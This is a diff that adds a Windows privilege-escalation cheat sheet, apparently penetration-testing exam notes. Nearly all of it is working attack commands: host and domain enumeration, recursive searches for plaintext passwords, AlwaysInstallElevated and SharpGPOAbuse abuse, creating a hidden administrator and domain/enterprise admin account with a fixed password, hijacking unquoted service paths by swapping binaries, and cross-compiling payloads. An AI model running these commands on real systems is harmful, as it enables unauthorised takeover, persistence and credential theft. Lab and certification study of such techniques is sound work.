@@ -1,0 +1,120 @@
+
+
+
+
+# Information about the machine
+systeminfo
+
+# Who are you and what privileges do you have:
+whoami
+whoami /priv
+
+# What users exist locally / on the domain
+net users
+net users /domain
+
+# Look at groups too, admins, domain admins, RDP users
+net localgroup
+net localgroup Administrators
+net localgroup /domain
+
+# List out all NT AUTHORITY/SYSTEM services:
+wmic service get name,startname |FINDSTR "NT"
+
+# Any scheduled tasks / I/O operations?
+schtasks /query /fo LIST /v > schtasks.txt
+
+# Print Nightmare? Looking for SetImpersonatePrivilege ENABLED:
+whoami /priv
+
+# Is this a domain box?
+Use sharphound for data collection and Bloodhound to read the data.
+
+# Can we install things elevated?
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+[Installing Elevated]
+msiexec /i <path to msi file>
+
+# Can you use SharpGPOAbuse? Import 'powerview.ps1'
+powershell.exe -ep bypass
+Import-Module .\Powerview.ps1
+Get-GPO -Name "Default Domain Policy" 
+	# Take down the ID number
+Get-GPPermission -GUID <ID> -TargetType User -TargetName <username>
+	# Returns permissions of user, GPO edit delete modify is lethal.
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
+gpupdate /force
+net users 
+	# You can now login with PSEXEC.PY
+	# > psexec.py vault.offsec/<user>:password@IP
+
+# Will the path to priv esc lie in a executable binary or service?
+cd "C:\Program Files"
+dir /a /o /q
+cd "C:\Program Files (x86)"
+dir /a /o /q
+
+# Networking information
+ipconfig /all
+
+# Who am I connected to? Is my loopback address running on an internal port?
+netstat -anoy
+route print
+arp -a
+
+# Clear text passwords in files?
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+
+# Passwords stored in config files?
+dir /s pass == cred == vnc == .config
+
+# Find all passwords in all files
+findstr /spin "password" .
+
+# Looking for Windows shares
+NET SHARE
+NET USE
+
+# Add an Administrator User with all of the goodies (not in a domain).
+cmd.exe /c net user siren superPassword /add
+cmd.exe /c net localgroup administrators siren /add
+cmd.exe /c net localgroup "Remote Desktop Users" siren /add
+
+# Adding a Windows Domain Administrator from the Command Line:
+cmd.exe /c net user siren superPassword /add
+net localgroup Administrators siren /ADD /DOMAIN
+net localgroup "Remote Desktop Users" siren /ADD /DOMAIN
+net group "Domain Admins" siren /ADD /DOMAIN
+net group "Enterprise Admins" siren /ADD /DOMAIN
+net group "Schema Admins" siren /ADD /DOMAIN
+net group "Group Policy Creator Owners" siren /ADD /DOMAIN
+
+# Finding unquoted service paths (use powerup)
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\" |findstr /i /v """
+	# Using SC -> sc qc <service name>
+	# Using icacls or cacls.exe (both native to windows)
+	icacls "C:\Program Files(x86)\UNQUOTED_SERVICE_PATH_SOFTWARE"
+	--> Exploit it.
+	--> If the path of the Binary file is:
+	C:\Program Files\something\something.exe
+	--> Then,
+	move something.exe something.exe.BACK
+	move sirenMaint.exe C:\Program Files\something\
+	move sirenMaint.exe something.exe
+	
+	
+# Windows-Exploit-Suggester https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+systeminfo
+	# Take the output and place it into the process for finding kernel exploits
+	
+# How do I cross-compile payloads for Windows on Linux, S1REN?
+apt-get install mingw-w64
+
++ Cross-Compilation Reference:
+# Ci686-w64-mingw32-gcc hello.c -o hello32.exe     
+# 32-bitx86_64-w64-mingw32-gcc hello.c -o hello64.exe    
+# 64-bit # C++i686-w64-mingw32-g++ hello.cc -o hello32.exe    
+# 32-bitx86_64-w64-mingw32-g++ hello.cc -o hello64.exe   # 64-bit
